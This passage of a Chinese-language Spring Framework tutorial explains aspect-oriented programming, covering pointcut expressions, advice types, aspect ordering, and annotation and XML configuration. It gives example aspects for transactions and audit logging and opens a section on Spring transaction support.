punctuation">;</span>        userServiceProxy<span class="token punctuation">.</span><span class="token function">logout</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><h3 id="十五、面向切面编程AOP"><a href="#十五、面向切面编程AOP" class="headerlink" title="十五、面向切面编程AOP"></a>十五、面向切面编程AOP</h3><p>IoC使软件组件松耦合。AOP让你能够捕捉系统中经常使用的功能，把它转化成组件。<br>AOP（Aspect Oriented Programming）：<strong>面向切面编程，面向方面编程</strong>。（AOP是一种编程技术）<br>AOP是对OOP的补充延伸。<br>AOP底层使用的就是动态代理来实现的。<br>Spring的<strong>AOP使用的动态代理</strong>是<strong>：JDK动态代理 + CGLIB动态代理技术</strong>。Spring在这两种动态代理中灵活切换，如果是代理接口，会默认使用JDK动态代理，如果要代理某个类，这个类没有实现接口，就会切换使用CGLIB。当然，你也可以强制通过一些配置让Spring只使用CGLIB。</p><h4 id="15-1-AOP介绍"><a href="#15-1-AOP介绍" class="headerlink" title="15.1 AOP介绍"></a>15.1 AOP介绍</h4><p>一般一个系统当中都会有一些系统服务，例如：<strong>日志、事务管理、安全</strong>等。这些系统服务被称为：<strong>交叉业务</strong><br>这些交叉业务几乎是通用的，不管你是做银行账户转账，还是删除用户数据。日志、事务管理、安全，这些都是需要做的。<br>如果在每一个业务处理过程当中，都掺杂这些交叉业务代码进去的话，存在两方面问题：<br>●第一：交叉业务代码在多个业务流程中反复出现，显然这个<strong>交叉业务代码</strong>没有得到<strong>复用</strong>。并且修改这些交叉业务代码的话，需要修改多处。<br>●第二：程序员<strong>无法专注核心业务代码</strong>的编写，在编写核心业务代码的同时还需要处理这些交叉业务。</p><p>用一句话总结AOP：将与核心业务无关的代码独立的抽取出来，形成一个独立的组件，然后以横向交叉的方式应用到业务流程当中的过程被称为AOP。<br>AOP的优点：<br>●第一：<strong>代码复用性增强</strong>。<br>●第二：<strong>代码易维护</strong>。<br>●第三：<strong>使开发者更关注业务逻辑</strong>。</p><h4 id="15-2-AOP的七大术语"><a href="#15-2-AOP的七大术语" class="headerlink" title="15.2 AOP的七大术语"></a>15.2 AOP的七大术语</h4><p>●连接点 Joinpoint<br>    ○在程序的整个执行流程中，可以织入切面的位置。方法的执行前后，异常抛出之后等位置。<br>●切点 Pointcut<br>    ○在程序执行流程中，真正织入切面的方法。（一个切点对应多个连接点）<br>●通知 Advice<br>    ○通知又叫增强，就是具体你要织入的代码。<br>    ○通知包括：<br>■前置通知<br>■后置通知<br>■环绕通知<br>■异常通知<br>■最终通知<br>●切面 Aspect<br>    ○切点 + 通知就是切面。<br>●织入 Weaving<br>    ○把通知应用到目标对象上的过程。<br>●代理对象 Proxy<br>    ○一个目标对象被织入通知后产生的新对象。<br>●目标对象 Target<br>    ○被织入通知的对象。</p><h4 id="15-3-切点表达式"><a href="#15-3-切点表达式" class="headerlink" title="15.3 切点表达式"></a>15.3 切点表达式</h4><pre><code>execution([访问控制权限修饰符] 返回值类型 [全限定类名]方法名(形式参数列表) [异常])execution(public * com.powernode.mall.service.*.delete*(..))</code></pre><p>访问控制权限修饰符：<br>●可选项。<br>●没写，就是4个权限都包括。<br>●写public就表示只包括公开的方法。<br>返回值类型：<br>●必填项。<br>●* 表示返回值类型任意。<br>全限定类名：<br>●可选项。<br>●两个点“..”代表当前包以及子包下的所有类。<br>●省略时表示所有的类。<br>方法名：<br>●必填项。<br>●<em>表示所有方法。<br>●set*表示所有的set方法。<br>形式参数列表：<br>●必填项<br>●() 表示没有参数的方法<br>●(..) 参数类型和个数随意的方法<br>●(</em>) 只有一个参数的方法<br>●(*, String) 第一个参数类型随意，第二个参数是String的。<br>异常：<br>●可选项。<br>●省略时表示任意异常类型。</p><h4 id="15-4-使用Spring的AOP"><a href="#15-4-使用Spring的AOP" class="headerlink" title="15.4 使用Spring的AOP"></a>15.4 使用Spring的AOP</h4><p>Spring对AOP的实现包括以下3种方式：<br>●第一种方式：Spring框架结合AspectJ框架实现的AOP，基于注解方式。<br>●第二种方式：Spring框架结合AspectJ框架实现的AOP，基于XML方式。<br>●第三种方式：Spring框架自己实现的AOP，基于XML配置方式。<br>实际开发中，都是Spring+AspectJ来实现AOP。所以我们重点学习第一种和第二种方式</p><h5 id="15-4-1-准备工作"><a href="#15-4-1-准备工作" class="headerlink" title="15.4.1 准备工作"></a>15.4.1 准备工作</h5><pre class=" language-xml"><code class="language-xml"><span class="token comment" spellcheck="true">&lt;!--spring context依赖--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.springframework<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>spring-context<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>6.0.0-M2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span><span class="token comment" spellcheck="true">&lt;!--spring aop依赖--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.springframework<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>spring-aop<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>6.0.0-M2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span><span class="token comment" spellcheck="true">&lt;!--spring aspects依赖--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.springframework<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>spring-aspects<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>6.0.0-M2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span></code></pre><pre class=" language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>beans</span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://www.springframework.org/schema/beans<span class="token punctuation">"</span></span>       <span class="token attr-name"><span class="token namespace">xmlns:</span>xsi</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://www.w3.org/2001/XMLSchema-instance<span class="token punctuation">"</span></span>       <span class="token attr-name"><span class="token namespace">xmlns:</span>context</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://www.springframework.org/schema/context<span class="token punctuation">"</span></span>       <span class="token attr-name"><span class="token namespace">xmlns:</span>aop</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://www.springframework.org/schema/aop<span class="token punctuation">"</span></span>       <span class="token attr-name"><span class="token namespace">xsi:</span>schemaLocation</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd                           http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context.xsd                           http://www.springframework.org/schema/aop http://www.springframework.org/schema/aop/spring-aop.xsd<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token comment" spellcheck="true">&lt;!--开启组件扫描--></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">context:</span>component-scan</span> <span class="token attr-name">base-package</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>com.powernode.spring6.service<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span>    <span class="token comment" spellcheck="true">&lt;!--开启自动代理--></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token namespace">aop:</span>aspectj-autoproxy</span> <span class="token attr-name">proxy-target-class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>true<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>beans</span><span class="token punctuation">></span></span></code></pre><p>&lt;aop:aspectj-autoproxy  proxy-target-class=”true”/&gt; 开启自动代理之后，凡事带有@Aspect注解的bean都会生成代理对象。<br>proxy-target-class=”true” 表示采用cglib动态代理。<br>proxy-target-class=”false” 表示采用jdk动态代理。默认值是false。即使写成false，当没有接口的时候，也会自动选择cglib生成代理类。</p><pre class=" language-java"><code class="language-java"><span class="token annotation punctuation">@Aspect</span><span class="token annotation punctuation">@Component</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MyAspect</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// 切点表达式</span>    <span class="token annotation punctuation">@Before</span><span class="token punctuation">(</span><span class="token string">"execution(* com.powernode.spring6.service.OrderService.*(..))"</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">// 这就是需要增强的代码（通知）</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">advice</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"我是一个通知"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h5 id="15-4-2-基于AspectJ的AOP注解式开发"><a href="#15-4-2-基于AspectJ的AOP注解式开发" class="headerlink" title="15.4.2 基于AspectJ的AOP注解式开发"></a>15.4.2 基于AspectJ的AOP注解式开发</h5><p>实现步骤</p><p>通知类型</p><p>切面的先后顺序</p><p>优化使用切点表达式<br>全注解式开发AOP</p><p>通知类型包括：<br>●前置通知：@Before 目标方法执行之前的通知<br>●后置通知：@AfterReturning 目标方法执行之后的通知<br>●环绕通知：@Around 目标方法之前添加通知，同时目标方法执行之后添加通知。<br>●异常通知：@AfterThrowing 发生异常之后执行的通知<br>●最终通知：@After 放在finally语句块中的通知</p><pre class=" language-java"><code class="language-java"><span class="token keyword">package</span> com<span class="token punctuation">.</span>powernode<span class="token punctuation">.</span>spring6<span class="token punctuation">.</span>service<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>aspectj<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>ProceedingJoinPoint<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>aspectj<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span>*<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>stereotype<span class="token punctuation">.</span>Component<span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 切面类</span><span class="token annotation punctuation">@Component</span><span class="token annotation punctuation">@Aspect</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MyAspect</span> <span class="token punctuation">{</span>    <span class="token annotation punctuation">@Around</span><span class="token punctuation">(</span><span class="token string">"execution(* com.powernode.spring6.service.OrderService.*(..))"</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">aroundAdvice</span><span class="token punctuation">(</span>ProceedingJoinPoint proceedingJoinPoint<span class="token punctuation">)</span> <span class="token keyword">throws</span> Throwable <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"环绕通知开始"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 执行目标方法。</span>        proceedingJoinPoint<span class="token punctuation">.</span><span class="token function">proceed</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"环绕通知结束"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Before</span><span class="token punctuation">(</span><span class="token string">"execution(* com.powernode.spring6.service.OrderService.*(..))"</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">beforeAdvice</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"前置通知"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@AfterReturning</span><span class="token punctuation">(</span><span class="token string">"execution(* com.powernode.spring6.service.OrderService.*(..))"</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">afterReturningAdvice</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"后置通知"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@AfterThrowing</span><span class="token punctuation">(</span><span class="token string">"execution(* com.powernode.spring6.service.OrderService.*(..))"</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">afterThrowingAdvice</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"异常通知"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@After</span><span class="token punctuation">(</span><span class="token string">"execution(* com.powernode.spring6.service.OrderService.*(..))"</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">afterAdvice</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"最终通知"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>当发生异常之后，最终通知也会执行，因为最终通知@After会出现在finally语句块中。<br>出现异常之后，后置通知和环绕通知的结束部分不会执行。</p><p><strong>切面的先后顺序</strong><br>我们知道，业务流程当中不一定只有一个切面，可能有的切面控制事务，有的记录日志，有的进行安全控制，如果多个切面的话，顺序如何控制：可以使用<strong>@Order</strong>注解来标识切面类，为@Order注解的value指定一个整数型的数字，<strong>数字越小，优先级越高</strong>。</p><pre class=" language-java"><code class="language-java"><span class="token annotation punctuation">@Component</span><span class="token annotation punctuation">@Aspect</span><span class="token annotation punctuation">@Order</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//设置优先级</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MyAspect</span> <span class="token punctuation">{</span></code></pre><p>公共切入点</p><pre class=" language-java"><code class="language-java">    <span class="token annotation punctuation">@Pointcut</span><span class="token punctuation">(</span><span class="token string">"execution(* com.powernode.spring6.service.OrderService.*(..))"</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">pointcut</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token punctuation">}</span>    <span class="token annotation punctuation">@Around</span><span class="token punctuation">(</span><span class="token string">"pointcut()"</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">aroundAdvice</span><span class="token punctuation">(</span>ProceedingJoinPoint proceedingJoinPoint<span class="token punctuation">)</span> <span class="token keyword">throws</span> Throwable <span class="token punctuation">{</span></code></pre><p>使用@Pointcut注解来定义独立的切点表达式。<br>注意这个@Pointcut注解标注的方法随意，只是起到一个能够让@Pointcut注解编写的位置。</p><h5 id="15-4-3-基于XML配置方式的AOP（了解）"><a href="#15-4-3-基于XML配置方式的AOP（了解）" class="headerlink" title="15.4.3 基于XML配置方式的AOP（了解）"></a>15.4.3 基于XML配置方式的AOP（了解）</h5><pre class=" language-java"><code class="language-java"><span class="token operator">&lt;</span><span class="token operator">?</span>xml version<span class="token operator">=</span><span class="token string">"1.0"</span> encoding<span class="token operator">=</span><span class="token string">"UTF-8"</span><span class="token operator">?</span><span class="token operator">></span><span class="token operator">&lt;</span>beans xmlns<span class="token operator">=</span><span class="token string">"http://www.springframework.org/schema/beans"</span>       xmlns<span class="token operator">:</span>xsi<span class="token operator">=</span><span class="token string">"http://www.w3.org/2001/XMLSchema-instance"</span>       xmlns<span class="token operator">:</span>context<span class="token operator">=</span><span class="token string">"http://www.springframework.org/schema/context"</span>       xmlns<span class="token operator">:</span>aop<span class="token operator">=</span><span class="token string">"http://www.springframework.org/schema/aop"</span>       xsi<span class="token operator">:</span>schemaLocation<span class="token operator">=</span>"http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>org<span class="token operator">/</span>schema<span class="token operator">/</span>beans http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>org<span class="token operator">/</span>schema<span class="token operator">/</span>beans<span class="token operator">/</span>spring<span class="token operator">-</span>beans<span class="token punctuation">.</span>xsd                           http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>org<span class="token operator">/</span>schema<span class="token operator">/</span>context http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>org<span class="token operator">/</span>schema<span class="token operator">/</span>context<span class="token operator">/</span>spring<span class="token operator">-</span>context<span class="token punctuation">.</span>xsd                           http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>org<span class="token operator">/</span>schema<span class="token operator">/</span>aop http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>org<span class="token operator">/</span>schema<span class="token operator">/</span>aop<span class="token operator">/</span>spring<span class="token operator">-</span>aop<span class="token punctuation">.</span>xsd"<span class="token operator">></span>    <span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span>纳入spring bean管理<span class="token operator">--</span><span class="token operator">></span>    <span class="token operator">&lt;</span>bean id<span class="token operator">=</span><span class="token string">"vipService"</span> <span class="token keyword">class</span><span class="token operator">=</span><span class="token string">"com.powernode.spring6.service.VipService"</span><span class="token operator">/</span><span class="token operator">></span>    <span class="token operator">&lt;</span>bean id<span class="token operator">=</span><span class="token string">"timerAspect"</span> <span class="token keyword">class</span><span class="token operator">=</span><span class="token string">"com.powernode.spring6.service.TimerAspect"</span><span class="token operator">/</span><span class="token operator">></span>    <span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span>aop配置<span class="token operator">--</span><span class="token operator">></span>    <span class="token operator">&lt;</span>aop<span class="token operator">:</span>config<span class="token operator">></span>        <span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span>切点表达式<span class="token operator">--</span><span class="token operator">></span>        <span class="token operator">&lt;</span>aop<span class="token operator">:</span>pointcut id<span class="token operator">=</span><span class="token string">"p"</span> expression<span class="token operator">=</span><span class="token string">"execution(* com.powernode.spring6.service.VipService.*(..))"</span><span class="token operator">/</span><span class="token operator">></span>        <span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span>切面<span class="token operator">--</span><span class="token operator">></span>        <span class="token operator">&lt;</span>aop<span class="token operator">:</span>aspect ref<span class="token operator">=</span><span class="token string">"timerAspect"</span><span class="token operator">></span>            <span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span>切面<span class="token operator">=</span>通知 <span class="token operator">+</span> 切点<span class="token operator">--</span><span class="token operator">></span>            <span class="token operator">&lt;</span>aop<span class="token operator">:</span>around method<span class="token operator">=</span><span class="token string">"time"</span> pointcut<span class="token operator">-</span>ref<span class="token operator">=</span><span class="token string">"p"</span><span class="token operator">/</span><span class="token operator">></span>        <span class="token operator">&lt;</span><span class="token operator">/</span>aop<span class="token operator">:</span>aspect<span class="token operator">></span>    <span class="token operator">&lt;</span><span class="token operator">/</span>aop<span class="token operator">:</span>config<span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>beans<span class="token operator">></span></code></pre><h4 id="15-5-AOP的实际案例：事务处理"><a href="#15-5-AOP的实际案例：事务处理" class="headerlink" title="15.5 AOP的实际案例：事务处理"></a>15.5 AOP的实际案例：事务处理</h4><p>项目中的事务控制是在所难免的。在一个业务流程当中，可能需要多条DML语句共同完成，为了保证数据的安全，这多条DML语句要么同时成功，要么同时失败。这就需要添加事务控制的代码。</p><pre class=" language-java"><code class="language-java">        <span class="token keyword">try</span><span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// 开启事务</span>            <span class="token function">startTransaction</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 执行核心业务逻辑</span>            <span class="token function">step1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">step2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">step3</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>            <span class="token comment" spellcheck="true">// 提交事务</span>            <span class="token function">commitTransaction</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token keyword">catch</span><span class="token punctuation">(</span>Exception e<span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// 回滚事务</span>            <span class="token function">rollbackTransaction</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span></code></pre><p>这个控制事务的代码就是和业务逻辑没有关系的“<strong>交叉业务</strong>”。以上伪代码当中可以看到这些交叉业务的代码没有得到复用，并且如果这些交叉业务代码需要修改，那必然需要修改多处，难维护，怎么解决？可以采用AOP思想解决。可以把以上控制事务的代码作为环绕通知，切入到目标类的方法当中。</p><pre class=" language-java"><code class="language-java"><span class="token annotation punctuation">@Aspect</span><span class="token annotation punctuation">@Component</span><span class="token comment" spellcheck="true">// 事务切面类</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TransactionAspect</span> <span class="token punctuation">{</span>    <span class="token annotation punctuation">@Around</span><span class="token punctuation">(</span><span class="token string">"execution(* com.powernode.spring6.biz..*(..))"</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">aroundAdvice</span><span class="token punctuation">(</span>ProceedingJoinPoint proceedingJoinPoint<span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"开启事务"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// 执行目标</span>            proceedingJoinPoint<span class="token punctuation">.</span><span class="token function">proceed</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"提交事务"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Throwable</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"回滚事务"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h4 id="15-6-AOP的实际案例：安全日志"><a href="#15-6-AOP的实际案例：安全日志" class="headerlink" title="15.6 AOP的实际案例：安全日志"></a>15.6 AOP的实际案例：安全日志</h4><p>需求是这样的：项目开发结束了，已经上线了。运行正常。客户提出了新的需求：凡事在系统中进行修改操作的，删除操作的，新增操作的，都要把这个人记录下来。因为这几个操作是属于危险行为。</p><pre class=" language-java"><code class="language-java"><span class="token annotation punctuation">@Component</span><span class="token annotation punctuation">@Aspect</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SecurityAspect</span> <span class="token punctuation">{</span>    <span class="token annotation punctuation">@Pointcut</span><span class="token punctuation">(</span><span class="token string">"execution(* com.powernode.spring6.biz..save*(..))"</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">savePointcut</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token punctuation">}</span>    <span class="token annotation punctuation">@Pointcut</span><span class="token punctuation">(</span><span class="token string">"execution(* com.powernode.spring6.biz..delete*(..))"</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">deletePointcut</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token punctuation">}</span>    <span class="token annotation punctuation">@Pointcut</span><span class="token punctuation">(</span><span class="token string">"execution(* com.powernode.spring6.biz..modify*(..))"</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">modifyPointcut</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token punctuation">}</span>    <span class="token annotation punctuation">@Before</span><span class="token punctuation">(</span><span class="token string">"savePointcut() || deletePointcut() || modifyPointcut()"</span><span class="token punctuation">)</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">beforeAdivce</span><span class="token punctuation">(</span>JoinPoint joinpoint<span class="token punctuation">)</span><span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"XXX操作员正在操作"</span><span class="token operator">+</span>joinpoint<span class="token punctuation">.</span><span class="token function">getSignature</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"方法"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h3 id="十六、Spring对事务的支持"><a href="#十六、Spring对事务的支持" class="headerlink" title="十六、Spring对事务的支持"></a>十六、Spring对事务的支持</h3><h4 id="16-1-事务概述"><a href="#16-1-事务概述" class="headerlink" title="16.1 事务概述"></a>16.1 事务概述</h4><p>●什么是事务<br>○在一个业务流程当中，通常需要多条DML（insert delete update）语句共同联合才能完成，这多条DML语句必须同时成功，或者同时失败，这样才能保证数据的安全。<br>○多条DML要么同时成功，要么同时失败，这叫做事务。<br>○事务：Transaction（tx）<br>●事务的四个处理过程：<br>○第一步：开启事务 (start transaction)<br>○第二步：执行核心业务代码<br>○第三步：提交事务（如果核心业务处理过程中没有出现异常）(commit transaction)<br>○第四步：回滚事务（如果核心业务处理过程中出现异常）(rollback transaction)<br>●事务的四个特性：<br>○A 原子性：事务是最小的工作单元，不可再分。<br>○C 一致性：事务要求要么同时成功，要么同时失败。事务前和事务后的总量不变。<br>○I 隔离性：事务和事务之间因为有隔离性，才可以保证互不干扰。<br>○D 持久性：持久性是事务结束的标志。</p><h4 id="16-2-引入事务场景"><a href="#16-2-引入事务场景" class="headerlink" title="16.2 引入事务场景"></a>16.2 引入事务场景</h4><p>以银行账户转账为例学习事务。两个账户act-001和act-002。act-001账户向act-002账户转账10000，必须同时成功，或者同时失败。（一个减成功，一个加成功， 